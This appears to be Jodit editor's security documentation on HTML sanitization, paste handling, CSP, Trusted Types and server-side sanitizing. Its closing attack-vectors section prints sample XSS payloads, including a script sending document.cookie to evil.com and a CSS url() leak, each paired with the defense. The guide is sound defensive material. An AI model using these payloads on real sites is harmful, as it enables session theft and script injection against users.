# Security, Sanitization & Content Security Policy (CSP)

Jodit Editor works with raw HTML, which means every piece of content entering or leaving the editor is a potential XSS vector. This guide covers Jodit's built-in defenses, how to configure them, and best practices for building secure applications.

> See also: [clean-html plugin reference](https://xdsoft.net/jodit/docs/modules/plugins_clean_html.html) | [paste plugin reference](https://xdsoft.net/jodit/docs/modules/plugins_paste.html) | [iframe plugin reference](https://xdsoft.net/jodit/docs/modules/plugins_iframe.html)

## Table of Contents

- [Architecture overview](#architecture-overview)
- [Plugin: clean-html — core sanitization](#plugin-clean-html)
- [Plugin: paste — clipboard protection](#plugin-paste)
- [Plugin: paste-from-word — Word/Excel cleanup](#plugin-paste-from-word)
- [Plugin: iframe — sandboxed editing](#plugin-iframe)
- [Content Security Policy (CSP)](#content-security-policy-csp)
- [Trusted Types API](#trusted-types-api)
- [HTML Sanitizer API (experimental)](#html-sanitizer-api)
- [Server-side sanitization](#server-side-sanitization)
- [Hardened configuration example](#hardened-configuration-example)
- [Security checklist](#security-checklist)

---

## Architecture Overview

Jodit's security model consists of multiple layers:

```
User input / paste / API (.value =)
        |
        v
+---------------------------+
|  0. sanitizer hook        |  <-- optional DOMPurify / external sanitizer
+-------------+-------------+
              |
              v
+--------------------------+
|  1. paste plugin         |  <-- asks user how to insert, strips tags
|  2. paste-from-word      |  <-- cleans Word/Excel markup
+-------------+------------+
              |
              v
+---------------------------------+
|  3. clean-html plugin           |
|   * safeHTML()                  |  <-- removes ALL on* handlers, javascript: links
|   * allowAttributes             |  <-- strips unknown attributes
|   * sanitizeStyles              |  <-- CSS property whitelist
|   * tryRemoveNode               |  <-- removes denied/unlisted tags
|   * safeLinksTarget             |  <-- auto rel="noopener noreferrer"
|   * sandboxIframesInContent     |  <-- sandbox="" on <iframe>
|   * convertUnsafeEmbeds         |  <-- <object>/<embed> -> sandboxed <iframe>
|   * replaceOldTags              |  <-- i->em, b->strong
+---------------------------------+
              |
              v
+--------------------------+
|  4. iframe sandbox       |  <-- optional: isolates editor DOM
+--------------------------+
```

**Key principle:** Jodit's client-side sanitization is a defense-in-depth measure. It should never be your only line of defense. Always sanitize on the server before storing or rendering user content.

---

## Plugin: clean-html

The [clean-html plugin](https://xdsoft.net/jodit/docs/modules/plugins_clean_html.html) (`src/plugins/clean-html/`) is the core sanitization engine. It runs continuously on every change, paste, mode switch, and programmatic value assignment.

### How it works

1. **LazyWalker** traverses every DOM node in the editor with a configurable `timeout` (default 300ms).
2. Each node passes through a chain of **filters** in `helpers/visitor/filters/`:
   - `tryRemoveNode` -- removes nodes based on `allowTags`/`denyTags`
   - `allowAttributes` -- strips attributes not in the whitelist
   - `sanitizeAttributes` -- removes all `on*` event handlers, neutralizes `javascript:` links
   - `sanitizeStyles` -- filters CSS properties by whitelist
   - `safeLinksTarget` -- adds `rel="noopener noreferrer"` to `target="_blank"` links
   - `sandboxIframesInContent` -- adds `sandbox=""` to `<iframe>` elements
   - `convertUnsafeEmbeds` -- converts `<object>`/`<embed>` to sandboxed `<iframe>`
   - `replaceOldTags` -- normalizes `<i>` to `<em>`, `<b>` to `<strong>`
   - `fillEmptyParagraph` -- removes empty `<p>` tags
   - `removeEmptyTextNode` -- removes empty text nodes
   - `removeInvTextNodes` -- removes invisible text nodes
3. On programmatic value assignment (`editor.value = ...`), `safeHTML()` runs **synchronously** before the value is set.

### Default protections (enabled out of the box)

| Protection | Config key | Default | What it does |
|---|---|---|---|
| Block dangerous tags | `denyTags` | `'script,iframe,object,embed'` | Removes `<script>`, `<iframe>`, `<object>`, `<embed>` |
| Remove ALL event handlers | `removeEventAttributes` | `true` | Strips all `on*` attributes (onclick, onerror, onload, etc.) |
| Neutralize `javascript:` | `safeJavaScriptLink` | `true` | Prefixes `javascript:` hrefs with the current protocol |
| Safe link targets | `safeLinksTarget` | `true` | Adds `rel="noopener noreferrer"` to `target="_blank"` links |
| Sandbox iframes | `sandboxIframesInContent` | `true` | Adds `sandbox=""` to `<iframe>` elements in content |
| Convert unsafe embeds | `convertUnsafeEmbeds` | `['object', 'embed']` | Converts listed tags to sandboxed `<iframe>` (`false` to disable) |

### allowTags -- whitelist mode

When `allowTags` is set, **only listed tags survive**. Everything else is removed. This is the strongest client-side protection.

**String format:**

```javascript
Jodit.make('#editor', {
    cleanHTML: {
        allowTags: 'p,a[href],strong,em,ul,ol,li,br,img[src,alt]'
    }
});
```

**Object format (more control):**

```javascript
Jodit.make('#editor', {
    cleanHTML: {
        allowTags: {
            p: true,                    // allow <p> with any attributes
            a: { href: true },          // allow <a> only with href
            strong: true,
            em: true,
            ul: true,
            ol: true,
            li: true,
            br: true,
            img: {
                src: true,
                alt: true,
                width: true,
                height: true
            }
        }
    }
});
```

**Pin to an exact value:**

```javascript
allowTags: {
    img: { src: '/images/logo.png' }  // only src="/images/logo.png" survives
}
```

### denyTags -- blacklist mode

When `allowTags` is `false` (default), `denyTags` is used instead. It removes only the listed tags.

```javascript
Jodit.make('#editor', {
    cleanHTML: {
        denyTags: 'script,iframe,object,embed,form,input,textarea,select'
    }
});
```

> **Priority:** `allowTags` always overrides `denyTags`. If both are set, `denyTags` is ignored.

### allowedStyles -- CSS property whitelist

Inline `style` attributes can be used for CSS injection attacks (e.g., data exfiltration via `background-image: url(...)`). The `allowedStyles` option lets you whitelist safe CSS properties:

```javascript
Jodit.make('#editor', {
    cleanHTML: {
        allowedStyles: {
            '*': ['color', 'background-color', 'font-size', 'text-align', 'font-weight'],
            img: ['width', 'height']
        }
    }
});
```

When set, any CSS property not in the whitelist is stripped. Supports global (`*`) and tag-specific rules.

### sanitizer -- external sanitizer hook

Integrate DOMPurify or any other sanitizer. The hook is called **before** Jodit's built-in sanitization on every `editor.value = ...` assignment:

```javascript
import DOMPurify from 'dompurify';

Jodit.make('#editor', {
    cleanHTML: {
        sanitizer: (html) => DOMPurify.sanitize(html)
    }
});
```

### useIframeSandbox -- extra parsing safety

When enabled, Jodit parses incoming HTML inside a sandboxed `<iframe sandbox="allow-same-origin">` before inserting it. This prevents scripts and event handlers from executing during the parsing step.

```javascript
Jodit.make('#editor', {
    cleanHTML: {
        useIframeSandbox: true
    }
});
```

Trade-off: slightly slower because it creates/destroys an iframe for each value assignment.

### Disabling specific filters

You can disable individual filters if they conflict with your use case:

```javascript
Jodit.make('#editor', {
    cleanHTML: {
        disableCleanFilter: new Set(['replaceOldTags']) // keep <i> and <b> as-is
    }
});
```

Available filter names: `tryRemoveNode`, `allowAttributes`, `sanitizeAttributes`, `sanitizeStyles`, `replaceOldTags`, `fillEmptyParagraph`, `removeEmptyTextNode`, `removeInvTextNodes`, `safeLinksTarget`, `sandboxIframesInContent`, `convertUnsafeEmbeds`.

---

## Plugin: paste

The [paste plugin](https://xdsoft.net/jodit/docs/modules/plugins_paste.html) (`src/plugins/paste/`) intercepts clipboard and drag-and-drop events.

### Paste modes

| Mode | Constant | Behavior |
|---|---|---|
| Keep HTML | `insert_as_html` | Inserts as-is (after `clean-html` processing) |
| Insert as Text | `insert_as_text` | HTML-encodes the content (`htmlspecialchars`) |
| Insert only Text | `insert_only_text` | Strips all tags, keeps plain text |
| Clean HTML | `insert_clear_html` | Runs `cleanFromWord` to remove styles/metadata |

### Configuration

```javascript
Jodit.make('#editor', {
    // Show dialog asking how to paste
    askBeforePasteHTML: true,

    // Process pasted HTML through the pipeline
    processPasteHTML: true,

    // Default paste mode (when dialog is disabled)
    defaultActionOnPaste: 'insert_as_html',

    // Tags preserved even in "insert only text" mode
    pasteExcludeStripTags: ['br', 'hr'],

    // Available options in the paste dialog
    pasteHTMLActionList: [
        { value: 'insert_as_html', text: 'Keep' },
        { value: 'insert_as_text', text: 'Insert as Text' },
        { value: 'insert_only_text', text: 'Insert only Text' }
    ]
});
```

### For maximum safety on paste

```javascript
Jodit.make('#editor', {
    askBeforePasteHTML: false,
    defaultActionOnPaste: 'insert_only_text'  // strip everything
});
```

---

## Plugin: paste-from-word

The [paste-from-word plugin](https://xdsoft.net/jodit/docs/modules/plugins_paste_from_word.html) (`src/plugins/paste-from-word/`) detects content from Microsoft Word/Excel and offers special cleaning.

Word documents embed massive amounts of XML namespaces, proprietary styles, and metadata. The `cleanFromWord()` helper:

1. Removes `<style>`, `<link>`, `<meta>` elements
2. Unwraps Word-specific tags (`<w:sdt>`, `<font>`)
3. Strips all attributes except `src`, `href`, `rel`, `content`
4. Removes XML comments and `<o:p>` tags

### Configuration

```javascript
Jodit.make('#editor', {
    // Show dialog for Word content
    askBeforePasteFromWord: true,

    // Enable Word detection
    processPasteFromWord: true,

    // Default action for Word content
    defaultActionOnPasteFromWord: 'insert_as_text', // cleanFromWord

    pasteFromWordActionList: [
        { value: 'insert_as_html', text: 'Keep' },
        { value: 'insert_as_text', text: 'Clean' },
        { value: 'insert_only_text', text: 'Insert only Text' }
    ]
});
```

---

## Plugin: iframe

The [iframe plugin](https://xdsoft.net/jodit/docs/modules/plugins_iframe.html) (`src/plugins/iframe/`) renders the editing area inside an `<iframe>`, isolating the editor's DOM from the host page.

### Basic iframe mode

```javascript
Jodit.make('#editor', {
    iframe: true,
    iframeStyle: 'html { margin: 0; } body { font-family: sans-serif; }'
});
```

### Sandboxed iframe

You can set the `sandbox` attribute for additional restrictions:

```javascript
Jodit.make('#editor', {
    iframe: true,
    iframeSandbox: 'allow-same-origin allow-scripts'
});
```

Available sandbox values follow the [HTML specification](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox). An empty string `''` enables all restrictions.

### Custom styles in iframe

```javascript
Jodit.make('#editor', {
    iframe: true,
    iframeStyle: 'body { color: #333; font-size: 14px; }',
    iframeCSSLinks: ['/css/editor-content.css']
});
```

---

## Content Security Policy (CSP)

### What Jodit uses that affects CSP

| Feature | CSP directive needed | Notes |
|---|---|---|
| Inline styles on elements | `style-src 'unsafe-inline'` | Jodit sets inline styles for formatting (font color, size, alignment, etc.) |
| `<style>` tags in iframe mode | `style-src 'unsafe-inline'` | The iframe plugin injects a `<style>` element |
| `document.write` in iframe mode | -- | Used to build the iframe document structure |
| `innerHTML` assignments | -- | Used internally for DOM manipulation |
| No `eval()` or `Function()` | -- | Jodit does NOT use `eval()` -- `script-src 'unsafe-eval'` is not required |
| No inline `<script>` | -- | Jodit does NOT inject inline scripts |
| External resources (CDN) | `script-src`, `style-src` | When loading from CDN |
| Image upload (base64) | `img-src data:` | When using `insertImageAsBase64URI: true` |
| Image upload (server) | `img-src https://your-api.com` | For server-hosted images |

### Minimal CSP for Jodit

Some Jodit plugins dynamically load external libraries from CDN. By default:

- **Source editor** (`sourceEditor: 'ace'`) loads [Ace](https://ace.c9.io/) from `cdnjs.cloudflare.com` (configurable via `sourceEditorCDNUrlsJS`)
- **HTML beautifier** (`beautifyHTML: true`) loads [js-beautify](https://github.com/beautifier/js-beautify) from `cdnjs.cloudflare.com` (configurable via `beautifyHTMLCDNUrlsJS`)
- **Paste Code** (Pro, [`pasteCode`](https://xdsoft.net/jodit/pro/docs/plugin/paste-code/) plugin) loads [Prism.js](https://prismjs.com/) from `cdnjs.cloudflare.com` — both JS and CSS (configurable via `pasteCode.highlightLib`)

If you use these defaults, you need to whitelist the CDN origin:

```http
Content-Security-Policy:
    default-src 'self';
    script-src 'self' https://cdnjs.cloudflare.com;
    style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;
    img-src 'self' data: https:;
    font-src 'self';
    frame-src 'self';
    connect-src 'self' https://your-api.com;
```

### Self-hosted external libraries (tighter CSP)

To avoid whitelisting external CDNs, host the libraries yourself and override the URLs:

```javascript
Jodit.make('#editor', {
    sourceEditorCDNUrlsJS: ['/vendor/ace/ace.js'],
    beautifyHTMLCDNUrlsJS: [
        '/vendor/js-beautify/beautify.min.js',
        '/vendor/js-beautify/beautify-html.min.js'
    ],
    // Pro only: pasteCode plugin
    pasteCode: {
        highlightLib: {
            js: ['/vendor/prism/prism.min.js'],
            css: ['/vendor/prism/prism.min.css']
        }
    }
});
```

Then your CSP needs only `'self'`:

```http
Content-Security-Policy:
    default-src 'self';
    script-src 'self';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self';
    frame-src 'self';
    connect-src 'self' https://your-api.com;
```

Alternatively, disable these features entirely if you don't need them:

```javascript
Jodit.make('#editor', {
    sourceEditor: 'area',  // plain textarea instead of Ace
    beautifyHTML: false,
    disablePlugins: ['pasteCode']  // Pro only
});
```

### CSP with nonce (when possible)

Jodit currently does not support nonce-based `<style>` injection. If your application has strict `style-src` without `'unsafe-inline'`, the iframe mode's injected `<style>` tag will be blocked. As a workaround:

1. Disable iframe mode and use external stylesheets for editor content styling
2. Or use `'unsafe-inline'` for `style-src` (acceptable for most applications since Jodit only injects styles, not scripts)

### CSP notes

- `'unsafe-eval'` is **NOT** required — Jodit never uses `eval()` or `new Function()`
- `'unsafe-inline'` in `script-src` is **NOT** required — Jodit never creates inline script elements
- `'unsafe-inline'` in `style-src` **IS** required — Jodit uses inline styles for text formatting (this is inherent to WYSIWYG editing)
- Replace `https://your-api.com` in `connect-src` with your actual upload/API endpoint

---

## Trusted Types API

[Trusted Types](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API) is a browser API that prevents DOM-based XSS by requiring all dangerous sink assignments (like `innerHTML`) to go through a policy.

Jodit uses `innerHTML` in multiple places internally (content assignment, helper functions, DOM manipulation). If your application enforces Trusted Types, you need to create a policy for Jodit.

### Creating a Trusted Types policy for Jodit

```javascript
// Create a policy that sanitizes HTML before Jodit processes it
if (window.trustedTypes) {
    const joditPolicy = trustedTypes.createPolicy('jodit-editor', {
        createHTML: (input) => {
            // Option 1: Trust Jodit's own sanitization
            return input;

            // Option 2: Run through DOMPurify first
            // return DOMPurify.sanitize(input);
        }
    });

    // You can use this policy to pre-sanitize content
    // before passing it to Jodit
    const safeHTML = joditPolicy.createHTML(untrustedContent);
    editor.value = safeHTML.toString();
}
```

### Using the sanitizer hook with Trusted Types

The simplest approach is to use the built-in `sanitizer` hook:

```javascript
import DOMPurify from 'dompurify';

Jodit.make('#editor', {
    cleanHTML: {
        sanitizer: (html) => DOMPurify.sanitize(html, {
            RETURN_TRUSTED_TYPE: false
        })
    }
});
```

### Wrapping Jodit with Trusted Types

If your CSP includes `require-trusted-types-for 'script'`, you'll need to either:

1. **Add a default policy** (simplest but least secure):

```javascript
if (window.trustedTypes) {
    trustedTypes.createPolicy('default', {
        createHTML: (input) => DOMPurify.sanitize(input, {
            RETURN_TRUSTED_TYPE: false
        })
    });
}
```

2. **Use the `beforeSetNativeEditorValue` event** to intercept and sanitize:

```javascript
const editor = Jodit.make('#editor');

editor.events.on('beforeSetNativeEditorValue', (data) => {
    // Sanitize before Jodit processes it
    data.value = yourSanitizer(data.value);
});
```

3. **Use the `safeHTML` event** to add custom sanitization:

```javascript
const editor = Jodit.make('#editor');

editor.events.on('safeHTML', (sandBox) => {
    // Custom DOM-level sanitization on the sandbox element
    sandBox.querySelectorAll('[onclick],[onmouseover]').forEach(el => {
        [...el.attributes].forEach(attr => {
            if (attr.name.startsWith('on')) {
                el.removeAttribute(attr.name);
            }
        });
    });
});
```

---

## HTML Sanitizer API

The [HTML Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API) is a native browser API for sanitizing HTML. As of 2026, it's available in modern browsers (Chrome 105+, Edge 105+, Firefox behind a flag).

### Using the Sanitizer API with Jodit

```javascript
// Check for browser support
if (typeof Sanitizer !== 'undefined') {
    const sanitizer = new Sanitizer({
        allowElements: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li',
                        'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
                        'table', 'thead', 'tbody', 'tr', 'td', 'th',
                        'img', 'blockquote', 'pre', 'code', 'hr', 'span', 'div', 'sub', 'sup'],
        allowAttributes: {
            'href': ['a'],
            'src': ['img'],
            'alt': ['img'],
            'class': ['*'],
            'style': ['*'],
            'target': ['a'],
            'colspan': ['td', 'th'],
            'rowspan': ['td', 'th']
        },
        // Block dangerous elements entirely
        blockElements: ['script', 'style', 'iframe', 'object', 'embed', 'form'],
        // Remove these elements and their content
        dropElements: ['script']
    });

    const editor = Jodit.make('#editor');

    // Sanitize on paste
    editor.events.on('beforePaste', (e) => {
        const dt = e.clipboardData;
        if (dt) {
            const html = dt.getData('text/html');
            if (html) {
                const div = document.createElement('div');
                div.setHTML(html, { sanitizer });
                e.preventDefault();
                editor.s.insertHTML(div.innerHTML);
                return false;
            }
        }
    });

    // Sanitize before saving
    function getSanitizedValue() {
        const div = document.createElement('div');
        div.setHTML(editor.value, { sanitizer });
        return div.innerHTML;
    }
}
```

### Using the sanitizer hook with the Sanitizer API

```javascript
const editor = Jodit.make('#editor', {
    cleanHTML: {
        sanitizer: typeof Sanitizer !== 'undefined'
            ? (html) => {
                const div = document.createElement('div');
                div.setHTML(html, { sanitizer: new Sanitizer({
                    blockElements: ['script', 'iframe', 'object', 'embed']
                }) });
                return div.innerHTML;
            }
            : false
    }
});
```

---

## Server-Side Sanitization

**Jodit's client-side sanitization must never be your only defense.** A malicious user can bypass any client-side check by sending a direct HTTP request to your server.

### Recommended server-side sanitizers

| Language | Library | Notes |
|---|---|---|
| **Node.js** | [DOMPurify](https://github.com/cure53/DOMPurify) + [jsdom](https://github.com/jsdom/jsdom) | Gold standard, battle-tested |
| **Node.js** | [sanitize-html](https://github.com/apostrophecms/sanitize-html) | Simple, configurable whitelist |
| **PHP** | [HTML Purifier](http://htmlpurifier.org/) | Comprehensive, standards-compliant |
| **Python** | [bleach](https://github.com/mozilla/bleach) | By Mozilla, simple API |
| **Java** | [OWASP Java HTML Sanitizer](https://github.com/OWASP/java-html-sanitizer) | OWASP project |
| **Go** | [bluemonday](https://github.com/microcosm-cc/bluemonday) | Fast, configurable |
| **Ruby** | [Sanitize](https://github.com/rgrove/sanitize) | Whitelist-based |

### Example: DOMPurify on Node.js

```javascript
import createDOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

function sanitizeEditorContent(html) {
    return DOMPurify.sanitize(html, {
        ALLOWED_TAGS: [
            'p', 'br', 'strong', 'em', 'u', 's', 'a', 'img',
            'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
            'table', 'thead', 'tbody', 'tfoot', 'tr', 'td', 'th',
            'blockquote', 'pre', 'code', 'hr', 'span', 'div', 'sub', 'sup'
        ],
        ALLOWED_ATTR: [
            'href', 'src', 'alt', 'title', 'class', 'style',
            'target', 'rel', 'colspan', 'rowspan', 'width', 'height'
        ],
        ALLOW_DATA_ATTR: false,
        ADD_ATTR: ['target'],
        FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
        ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i
    });
}

// Express.js middleware
app.post('/api/content', (req, res) => {
    const cleanHTML = sanitizeEditorContent(req.body.content);
    // Store cleanHTML in database
    db.save({ content: cleanHTML });
    res.json({ success: true });
});
```

### Example: sanitize-html on Node.js

```javascript
import sanitizeHtml from 'sanitize-html';

function sanitizeEditorContent(html) {
    return sanitizeHtml(html, {
        allowedTags: sanitizeHtml.defaults.allowedTags.concat([
            'img', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
            'span', 'sub', 'sup', 'u', 's'
        ]),
        allowedAttributes: {
            'a': ['href', 'target', 'rel'],
            'img': ['src', 'alt', 'width', 'height'],
            'td': ['colspan', 'rowspan'],
            'th': ['colspan', 'rowspan'],
            '*': ['class', 'style']
        },
        allowedStyles: {
            '*': {
                'color': [/^#(0x)?[0-9a-f]+$/i, /^rgb\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*\)$/],
                'text-align': [/^left$/, /^right$/, /^center$/, /^justify$/],
                'font-size': [/^\d+(?:px|em|rem|%)$/],
                'font-weight': [/^bold$/, /^\d+$/],
                'text-decoration': [/^underline$/, /^line-through$/],
                'background-color': [/^#(0x)?[0-9a-f]+$/i, /^rgb/]
            }
        },
        // Disallow javascript: URIs
        allowedSchemes: ['http', 'https', 'mailto', 'tel'],
        // Transform tags
        transformTags: {
            'a': sanitizeHtml.simpleTransform('a', { rel: 'noopener noreferrer' })
        }
    });
}
```

---

## Hardened Configuration Example

A production-ready configuration combining all security layers:

```javascript
const editor = Jodit.make('#editor', {
    // -- Clean HTML: core sanitization --
    cleanHTML: {
        // Whitelist approach: only allow safe tags
        allowTags: Jodit.atom({
            p: true,
            br: true,
            strong: true,
            em: true,
            u: true,
            s: true,
            a: { href: true, target: true, rel: true },
            img: { src: true, alt: true, width: true, height: true },
            ul: true,
            ol: true,
            li: true,
            h1: true,
            h2: true,
            h3: true,
            h4: true,
            h5: true,
            h6: true,
            table: true,
            thead: true,
            tbody: true,
            tr: true,
            td: { colspan: true, rowspan: true },
            th: { colspan: true, rowspan: true },
            blockquote: true,
            pre: true,
            code: true,
            hr: true,
            span: { style: true },
            div: true,
            sub: true,
            sup: true
        }),

        // CSS property whitelist (prevents CSS injection)
        allowedStyles: {
            '*': ['color', 'background-color', 'font-size', 'text-align',
                  'font-weight', 'text-decoration', 'font-family', 'vertical-align'],
            img: ['width', 'height'],
            td: ['width', 'height'],
            th: ['width', 'height']
        },

        // XSS protections (all enabled by default, listed for clarity)
        removeEventAttributes: true,
        safeJavaScriptLink: true,
        safeLinksTarget: true,
        sandboxIframesInContent: true,
        convertUnsafeEmbeds: Jodit.atom(['object', 'embed']),

        // Use sandbox for parsing (slightly slower, more secure)
        useIframeSandbox: true,

        // Optional: integrate DOMPurify for maximum protection
        // sanitizer: (html) => DOMPurify.sanitize(html),

        // Tag normalization
        replaceOldTags: Jodit.atom({
            i: 'em',
            b: 'strong'
        })
    },

    // -- Paste: clipboard protection --
    askBeforePasteHTML: true,
    processPasteHTML: true,
    defaultActionOnPaste: 'insert_as_html',
    pasteExcludeStripTags: Jodit.atom(['br', 'hr']),

    // -- Paste from Word --
    askBeforePasteFromWord: true,
    processPasteFromWord: true,
    defaultActionOnPasteFromWord: 'insert_as_text',

    // -- Upload: prevent arbitrary file uploads --
    uploader: {
        insertImageAsBase64URI: false,     // Use server upload instead
        url: '/api/upload',                 // Your upload endpoint
        filesVariableName: 'files',
        imagesExtensions: Jodit.atom(['jpg', 'jpeg', 'png', 'gif', 'svg', 'webp'])
    },

    // -- Iframe mode (optional additional isolation) --
    // iframe: true,
    // iframeSandbox: 'allow-same-origin allow-scripts',
});
```

---

## Security Checklist

### Client-Side (Jodit Configuration)

- [ ] Keep `cleanHTML.denyTags` at default (`'script,iframe,object,embed'`) or use `allowTags` whitelist
- [ ] Keep `cleanHTML.removeEventAttributes: true` (default) -- removes all `on*` handlers
- [ ] Keep `cleanHTML.safeJavaScriptLink: true` (default)
- [ ] Keep `cleanHTML.safeLinksTarget: true` (default) -- auto `rel="noopener noreferrer"`
- [ ] Keep `cleanHTML.sandboxIframesInContent: true` (default)
- [ ] Keep `cleanHTML.convertUnsafeEmbeds` at default `['object', 'embed']`
- [ ] Consider `cleanHTML.allowedStyles` to whitelist CSS properties
- [ ] Consider `cleanHTML.sanitizer` to integrate DOMPurify
- [ ] Enable `cleanHTML.useIframeSandbox: true` for high-security contexts
- [ ] Configure `askBeforePasteHTML: true` to let users control paste behavior
- [ ] Set `defaultActionOnPasteFromWord: 'insert_as_text'` to clean Word content

### Server-Side (Your Backend)

- [ ] **Always sanitize HTML on the server** before storing or rendering
- [ ] Use a proven library (DOMPurify, HTML Purifier, bleach, etc.)
- [ ] Whitelist allowed tags and attributes -- don't rely on blacklists
- [ ] Validate and whitelist URL schemes in `href`/`src` (`http:`, `https:`, `mailto:`)
- [ ] Strip or validate `style` attributes (CSS injection can leak data)
- [ ] Set `rel="noopener noreferrer"` on all user-generated links with `target="_blank"`
- [ ] Validate uploaded file types and content, not just extensions

### HTTP Headers

- [ ] Set a Content-Security-Policy header
- [ ] Set `X-Content-Type-Options: nosniff`
- [ ] Set `X-Frame-Options: DENY` (or `SAMEORIGIN` if using iframe mode)
- [ ] Set `Referrer-Policy: strict-origin-when-cross-origin`
- [ ] Consider `require-trusted-types-for 'script'` with a policy for Jodit

### Rendering User Content

- [ ] Never render editor output with `v-html` (Vue), `dangerouslySetInnerHTML` (React), or `{!! !!}` (Blade) without server-side sanitization
- [ ] Consider rendering in a sandboxed iframe: `<iframe sandbox="allow-same-origin" srcdoc="..."></iframe>`
- [ ] Apply the same CSP to pages that render user content

---

## Common Attack Vectors and Defenses

### 1. `<script>` injection

```html
<!-- Attack -->
<script>document.location='https://evil.com/?c='+document.cookie</script>

<!-- Defense: denyTags (default) blocks <script> -->
```

### 2. Event handler attributes

```html
<!-- Attack -->
<img src="x" onerror="alert(document.cookie)">
<div onclick="alert(1)">click me</div>
<svg onload="alert(1)">
<input onfocus="alert(1)" autofocus>

<!-- Defense: removeEventAttributes (default: true) strips ALL on* attributes -->
```

### 3. `javascript:` URIs

```html
<!-- Attack -->
<a href="javascript:alert(1)">Click</a>

<!-- Defense: safeJavaScriptLink neutralizes javascript: URIs (default) -->
```

### 4. `window.opener` attack

```html
<!-- Attack -->
<a href="https://evil.com" target="_blank">Click</a>
<!-- evil.com can access window.opener and redirect the original page -->

<!-- Defense: safeLinksTarget (default: true) adds rel="noopener noreferrer" -->
```

### 5. CSS injection (data exfiltration)

```html
<!-- Attack -->
<p style="background-image: url('https://evil.com/leak?data=secret')">text</p>

<!-- Defense: allowedStyles whitelist blocks unauthorized CSS properties -->
```

### 6. Unsafe embeds

```html
<!-- Attack -->
<object data="https://evil.com/malware.swf" type="application/x-shockwave-flash"></object>
<embed src="https://evil.com/exploit.swf">

<!-- Defense: convertUnsafeEmbeds (default: true) converts to sandboxed iframe -->
<!-- Defense: denyTags (default) blocks object and embed -->
```

### 7. Unsandboxed iframes

```html
<!-- Attack -->
<iframe src="https://evil.com/phishing"></iframe>
<!-- Can run scripts, access parent page, show phishing content -->

<!-- Defense: sandboxIframesInContent (default: true) adds sandbox="" -->
<!-- Defense: denyTags (default) blocks iframe entirely -->
```

### 8. SVG-based XSS

```html
<!-- Attack -->
<svg onload="alert(1)"><circle r="50"/></svg>

<!-- Defense: removeEventAttributes strips onload -->
<!-- Defense: allowTags whitelist (don't include svg unless needed) -->
```

### 9. Mutation XSS (mXSS)

Some HTML, when parsed and re-serialized, produces different (malicious) DOM. Jodit mitigates this with:
- `useIframeSandbox: true` -- parses in an isolated context
- The continuous `LazyWalker` re-checks DOM after mutations
- `sanitizer` hook -- use DOMPurify which specifically handles mXSS vectors

For maximum protection against mXSS, use DOMPurify on the server.

---

## Migration from v4.10.x

### Breaking changes in v4.11.0

1. **`denyTags` default changed** from `'script'` to `'script,iframe,object,embed'`

   If you need iframes in your content:
   ```javascript
   cleanHTML: { denyTags: 'script' }
   ```

2. **`removeEventAttributes` replaces `removeOnError`**

   Now removes ALL `on*` event handlers, not just `onerror`. The `removeOnError` option still works but is deprecated.

3. **`safeLinksTarget` is now `true` by default**

   All `target="_blank"` links get `rel="noopener noreferrer"`. To disable:
   ```javascript
   cleanHTML: { safeLinksTarget: false }
   ```

4. **`sandboxIframesInContent` is now `true` by default**

   All `<iframe>` in content get `sandbox=""`. To disable:
   ```javascript
   cleanHTML: { sandboxIframesInContent: false }
   ```

5. **`convertUnsafeEmbeds` is now `['object', 'embed']` by default**

   `<object>` and `<embed>` are converted to sandboxed `<iframe>`. To disable:
   ```javascript
   cleanHTML: { convertUnsafeEmbeds: false }
   ```
